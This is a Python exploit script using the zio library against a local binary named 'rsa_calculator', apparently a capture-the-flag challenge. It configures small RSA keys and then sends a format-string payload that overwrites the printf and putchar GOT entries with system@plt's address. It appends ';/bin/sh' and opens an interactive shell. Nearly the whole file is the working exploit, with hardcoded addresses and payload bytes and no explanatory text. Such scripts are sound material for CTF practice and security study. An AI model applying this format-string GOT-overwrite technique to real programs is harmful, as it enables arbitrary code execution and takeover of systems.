from zio import *
target  = './rsa_calculator'
# io.gdb_hint([0x400fa9]) # rsa_encrypt ret
# x/800xg $rbp-0x1040

def set_key(io, p, q, e, d):
    io.read_until('> ')
    io.writeline('1')
    io.read_until('p :')
    io.writeline(str(p))
    io.read_until('q :')
    io.writeline(str(q))
    io.read_until('e :')
    io.writeline(str(e))
    io.read_until('d :')
    io.writeline(str(d))

def encrypt(io, payload):
    io.read_until('> ')
    io.writeline('2')
    io.read_until(' : ')
    io.writeline(str(len(payload)))
    io.read_until('paste your plain text data')
    io.writeline(str(payload))
    
def decrypt(io, payload):
    io.read_until('> ')
    io.writeline('3')
    io.read_until(' : ')
    io.writeline(str(len(payload)))
    io.read_until('paste your hex encoded data')
    io.writeline(str(payload))
    
def sub_egcd(a, b):
    if b == 0:
        return a, 1, 0
    else:
        g, x, y = sub_egcd(b, a % b)
        return g, y, x - a / b * y

def egcd(a,b):
    return sub_egcd(a,b)[1]%b

def get_cypher(io, plain):
    encrypt(io, plain)
    return [io.read_line() for j in range(0, 3)][2][0:-1]

def get_plain(io, cypher):
    decrypt(io, cypher)
    return [io.read_line() for j in range(0, 3)][2][0:-1]

def exp(target):
    p = 7
    q = 37
    e = 7
    d = egcd(e, (p-1) * (q-1)) 
    #print 'p=%d\nq=%d\ne=%d\nd=%d\n' % (p, q, e, d)

    # io = zio(target, timeout = 100000, print_read = COLORED(RAW, 'red'), print_write = COLORED(RAW, 'yellow'))
    io = zio(target, timeout = 100000, print_read = False, print_write = False)
    io.gdb_hint([0x401238, 0x4011b6]) # RSA_decrypt_ret
    set_key(io, p, q, e, d)

    plt_system  = 0x004007c0
    got_printf  = 0x00602028
    got_putchar = 0x00602000
    adr_ret     = 0x0040122b

    payload  = get_cypher(io, '%83$n%79$n%064lx%78$hn%82$hn%01920lx%77$hn%02667lx%81$hn;/bin/sh\x00')
    payload += l64(got_printf)
    payload += l64(got_printf + 2)
    payload += l64(got_printf + 4)
    payload += l64(got_printf + 6)
    payload += l64(got_putchar)
    payload += l64(got_putchar + 2)
    payload += l64(got_putchar + 4)
    payload += l64(got_putchar + 6)
    decrypt(io, payload)
    io.interact()
    
exp(target)
